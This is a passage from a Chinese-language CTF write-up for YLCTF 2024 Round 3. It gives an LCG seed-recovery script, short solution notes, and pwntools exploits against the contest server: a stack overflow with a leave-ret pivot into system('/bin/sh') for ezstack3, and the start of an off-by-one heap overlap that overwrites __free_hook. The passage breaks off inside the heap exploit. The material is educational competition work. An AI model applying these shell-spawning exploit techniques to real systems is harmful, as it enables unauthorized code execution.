</span></span><span style=display:flex><span>(g3 是标记获取之前保存的对象（即要执行的命令）。
</span></span></code></pre></div><h3 id=round-3>Round 3</h3><h4 id=crypto-2>crypto</h4><h5 id=round-3-ezlcg>[Round 3] ezlcg</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> inverse
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;challenge.yuanloo.com&#34;</span>, <span style=color:#ae81ff>22178</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 跳过前27行</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>27</span>):
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>solve_lcg_parameters</span>(states, N):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;求解LCG的参数a和b&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    diffs <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(states) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>):
</span></span><span style=display:flex><span>        diffs<span style=color:#f92672>.</span>append((states[i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>] <span style=color:#f92672>-</span> states[i]) <span style=color:#f92672>%</span> N)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    a_candidates <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(diffs) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> diffs[i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>] <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>                a <span style=color:#f92672>=</span> (diffs[i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>] <span style=color:#f92672>*</span> inverse(diffs[i], N)) <span style=color:#f92672>%</span> N
</span></span><span style=display:flex><span>                a_candidates<span style=color:#f92672>.</span>append(a)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> len(a_candidates) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>        a <span style=color:#f92672>=</span> max(set(a_candidates), key<span style=color:#f92672>=</span>a_candidates<span style=color:#f92672>.</span>count)
</span></span><span style=display:flex><span>        b <span style=color:#f92672>=</span> (states[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>-</span> a <span style=color:#f92672>*</span> states[<span style=color:#ae81ff>0</span>]) <span style=color:#f92672>%</span> N
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> a, b
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>, <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>find_seed</span>(N, num1, num2, num3):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;从三个连续状态值找到初始种子&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    states <span style=color:#f92672>=</span> [num1, num2, num3]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 求解a和b</span>
</span></span><span style=display:flex><span>    a, b <span style=color:#f92672>=</span> solve_lcg_parameters(states, N)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> a <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> b:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>, <span style=color:#66d9ef>None</span>, <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 反推seed</span>
</span></span><span style=display:flex><span>    seed <span style=color:#f92672>=</span> ((num1 <span style=color:#f92672>-</span> b) <span style=color:#f92672>*</span> inverse(a, N)) <span style=color:#f92672>%</span> N
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 验证</span>
</span></span><span style=display:flex><span>    state <span style=color:#f92672>=</span> seed
</span></span><span style=display:flex><span>    verified <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> expected <span style=color:#f92672>in</span> [num1, num2, num3]:
</span></span><span style=display:flex><span>        state <span style=color:#f92672>=</span> (state <span style=color:#f92672>*</span> a <span style=color:#f92672>+</span> b) <span style=color:#f92672>%</span> N
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> state <span style=color:#f92672>!=</span> expected:
</span></span><span style=display:flex><span>            verified <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> seed, a, b <span style=color:#66d9ef>if</span> verified <span style=color:#66d9ef>else</span> (<span style=color:#66d9ef>None</span>, <span style=color:#66d9ef>None</span>, <span style=color:#66d9ef>None</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>50</span>):
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;seed =&#34;</span><span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    a_match <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;a=(\d+)&#39;</span>, data)
</span></span><span style=display:flex><span>    b_match <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;b=(\d+)&#39;</span>, data)
</span></span><span style=display:flex><span>    N_match <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;N=(\d+)&#39;</span>, data)
</span></span><span style=display:flex><span>    num1_match <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;num1=(\d+)&#39;</span>, data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> a_match <span style=color:#f92672>and</span> b_match <span style=color:#f92672>and</span> N_match <span style=color:#f92672>and</span> num1_match:
</span></span><span style=display:flex><span>        a <span style=color:#f92672>=</span> int(a_match<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>        b <span style=color:#f92672>=</span> int(b_match<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>        N <span style=color:#f92672>=</span> int(N_match<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>        num1 <span style=color:#f92672>=</span> int(num1_match<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>find_seed_a_b</span>(a, b, N, num1):
</span></span><span style=display:flex><span>            left_side <span style=color:#f92672>=</span> (num1 <span style=color:#f92672>-</span> b) <span style=color:#f92672>%</span> N
</span></span><span style=display:flex><span>            a_inv <span style=color:#f92672>=</span> inverse(a, N)
</span></span><span style=display:flex><span>            seed <span style=color:#f92672>=</span> (left_side <span style=color:#f92672>*</span> a_inv) <span style=color:#f92672>%</span> N
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> seed
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        seed <span style=color:#f92672>=</span> find_seed_a_b(a, b, N, num1)
</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>sendline(str(seed))
</span></span><span style=display:flex><span>        response <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;success!&#34;</span><span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        print(response<span style=color:#f92672>.</span>decode())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;Challenge two,30 Round&#34;</span><span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;Challenge two,30 Round&#34;</span> <span style=color:#f92672>in</span> response<span style=color:#f92672>.</span>decode():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>30</span>):
</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;seed =&#34;</span><span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        a_match <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;a=(\d+)&#39;</span>, data)
</span></span><span style=display:flex><span>        N_match <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;N=(\d+)&#39;</span>, data)
</span></span><span style=display:flex><span>        num1_match <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;num1=(\d+)&#39;</span>, data)
</span></span><span style=display:flex><span>        num2_match <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;num2=(\d+)&#39;</span>, data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> a_match <span style=color:#f92672>and</span> N_match <span style=color:#f92672>and</span> num1_match <span style=color:#f92672>and</span> num2_match:
</span></span><span style=display:flex><span>            a <span style=color:#f92672>=</span> int(a_match<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>            N <span style=color:#f92672>=</span> int(N_match<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>            num1 <span style=color:#f92672>=</span> int(num1_match<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>            num2 <span style=color:#f92672>=</span> int(num2_match<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>lcg_seed</span>(num1, num2, a, N):
</span></span><span style=display:flex><span>                b <span style=color:#f92672>=</span> (num2 <span style=color:#f92672>-</span> (a <span style=color:#f92672>*</span> num1) <span style=color:#f92672>%</span> N <span style=color:#f92672>+</span> N) <span style=color:#f92672>%</span> N
</span></span><span style=display:flex><span>                seed <span style=color:#f92672>=</span> (num1 <span style=color:#f92672>-</span> b) <span style=color:#f92672>*</span> inverse(a, N) <span style=color:#f92672>%</span> N
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> seed
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            seed <span style=color:#f92672>=</span> lcg_seed(num1, num2, a, N)
</span></span><span style=display:flex><span>            p<span style=color:#f92672>.</span>sendline(str(seed))
</span></span><span style=display:flex><span>            response <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;success!&#34;</span><span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>            print(response<span style=color:#f92672>.</span>decode())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Challenge three 部分</span>
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;Challenge three,10 Round&#34;</span><span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;Challenge three,10 Round&#34;</span> <span style=color:#f92672>in</span> data:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;进入 Challenge three, 10 Round&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>10</span>):
</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;seed =&#34;</span><span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        N_match <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;N=(\d+)&#39;</span>, data)
</span></span><span style=display:flex><span>        num1_match <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;num1=(\d+)&#39;</span>, data)
</span></span><span style=display:flex><span>        num2_match <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;num2=(\d+)&#39;</span>, data)
</span></span><span style=display:flex><span>        num3_match <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;num3=(\d+)&#39;</span>, data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> N_match <span style=color:#f92672>and</span> num1_match <span style=color:#f92672>and</span> num2_match <span style=color:#f92672>and</span> num3_match:
</span></span><span style=display:flex><span>            N <span style=color:#f92672>=</span> int(N_match<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>            num1 <span style=color:#f92672>=</span> int(num1_match<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>            num2 <span style=color:#f92672>=</span> int(num2_match<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>            num3 <span style=color:#f92672>=</span> int(num3_match<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e># 使用 LCG 解密函数找到 seed</span>
</span></span><span style=display:flex><span>            seed, a, b <span style=color:#f92672>=</span> find_seed(N, num1, num2, num3)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> seed <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>                p<span style=color:#f92672>.</span>sendline(str(seed))
</span></span><span style=display:flex><span>                response <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;success!&#34;</span><span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>                print(response<span style=color:#f92672>.</span>decode())
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>&#34;无法找到种子&#34;</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><h5 id=round-3-qwq>[Round 3] QWQ</h5><p>明显的颜文字，转一下再base解密即可</p><p><img alt=qwq loading=lazy src=/posts/ctf/ylctf2024/qwq.png></p><h4 id=misc-2>Misc</h4><h5 id=round-3-blackdoor>[Round 3] Blackdoor</h5><p>一个文件夹，用d盾扫一下发现危险文件，里面有MD5值，套一下得到flag</p><h4 id=pwn-2>Pwn</h4><h5 id=round-3-secret>[Round 3] Secret</h5><p>附件ida打开输入nc连接输入密文<code>SuperSecretPassword</code>得到flag</p><h5 id=round-3-ezstack3>[Round 3] ezstack3</h5><p>先看mian和vuln,再观察system利用栈溢出漏洞首先发送填充数据以覆盖返回地址，然后接收 EBP 地址并计算其偏移。接着构造 payload，调用 <code>system</code> 函数执行 <code>/bin/sh</code>，最终获得交互式 shell。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;challenge.yuanloo.com&#39;</span>, <span style=color:#ae81ff>32407</span>)
</span></span><span style=display:flex><span>context(os<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;linux&#39;</span>, arch<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;i386&#39;</span>, log_level<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;debug&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Welcome to YLCTF stack3&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x30</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x30</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ebp <span style=color:#f92672>=</span> u32(p<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>4</span>)) <span style=color:#f92672>-</span> <span style=color:#ae81ff>16</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;pwn!&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>send(
</span></span><span style=display:flex><span>    p32(<span style=color:#ae81ff>0x080490C0</span>) <span style=color:#f92672>+</span>    <span style=color:#75715e># system</span>
</span></span><span style=display:flex><span>    p32(<span style=color:#ae81ff>0</span>) <span style=color:#f92672>+</span>            <span style=color:#75715e># argument for system</span>
</span></span><span style=display:flex><span>    p32(ebp <span style=color:#f92672>-</span> <span style=color:#ae81ff>36</span>) <span style=color:#f92672>+</span>     <span style=color:#75715e># return address</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>+</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>28</span> <span style=color:#f92672>+</span>
</span></span><span style=display:flex><span>    p32(ebp <span style=color:#f92672>-</span> <span style=color:#ae81ff>52</span>) <span style=color:#f92672>+</span>     <span style=color:#75715e># old EBP</span>
</span></span><span style=display:flex><span>    p32(<span style=color:#ae81ff>0x08049324</span>)     <span style=color:#75715e># leave_ret</span>
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p><img alt=stack3 loading=lazy src=/posts/ctf/ylctf2024/stack3.png></p><h5 id=round-3-null>[Round 3] null</h5><p>利用了 off-by-one 漏洞，通过 <code>edit</code> 函数实现堆块重叠，进而修改前一个堆块的 <code>fd</code> 指针以覆盖 <code>free_hook</code>。当再次释放该堆块时，程序会调用 <code>free_hook</code> 指向的地址，执行 <code>system</code> 函数，从而获取权限并启动一个 shell。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>os <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;linux&#39;</span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;debug&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>print_info</span>(x): print(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x1b</span><span style=color:#e6db74>[01;38;5;214m&#39;</span> <span style=color:#f92672>+</span> x <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x1b</span><span style=color:#e6db74>[0m&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>print_error</span>(x): print(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x1b</span><span style=color:#e6db74>[01;38;5;1m&#39;</span> <span style=color:#f92672>+</span> x <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x1b</span><span style=color:#e6db74>[0m&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Exploit</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self, is_remote<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>):
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>elf <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./pwn&#39;</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./libc-2.27.so&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> is_remote:
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;challenge.yuanloo.com&#39;</span>, <span style=color:#ae81ff>39010</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>p <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./pwn&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>libc_base <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>malloc_hook <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>free_hook <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>system <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>bin_sh <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_addr64</span>(self):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> u64(self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x7f</span><span style=color:#e6db74>&#34;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>6</span>:]<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_libc_offsets</span>(self):
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>malloc_hook <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>libc_base <span style=color:#f92672>+</span> self<span style=color:#f92672>.</span>libc<span style=color:#f92672>.</span>sym[<span style=color:#e6db74>&#39;__malloc_hook&#39;</span>]
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>free_hook <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>libc_base <span style=color:#f92672>+</span> self<span style=color:#f92672>.</span>libc<span style=color:#f92672>.</span>sym[<span style=color:#e6db74>&#39;__free_hook&#39;</span>]
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>system <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>libc_base <span style=color:#f92672>+</span> self<span style=color:#f92672>.</span>libc<span style=color:#f92672>.</span>sym[<span style=color:#e6db74>&#39;system&#39;</span>]
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>bin_sh <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>libc_base <span style=color:#f92672>+</span> next(self<span style=color:#f92672>.</span>libc<span style=color:#f92672>.</span>search(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;/bin/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Heap operations</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>add</span>(self, index, size):
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;:&#39;</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>sendline(str(<span style=color:#ae81ff>1</span>))
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Index: &#34;</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>sendline(str(index))
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Size &#34;</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>sendline(str(size))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>free</span>(self, index):
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;:&#39;</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>sendline(str(<span style=color:#ae81ff>4</span>))
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Index: &#34;</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>sendline(str(index))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>show</span>(self, index):
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;:&#39;</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>sendline(str(<span style=color:#ae81ff>3</span>))
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Index: &#34;</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>p<span style=color:#f92672>.</span>sendline(str(index))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>edit</span>(self, index, content):
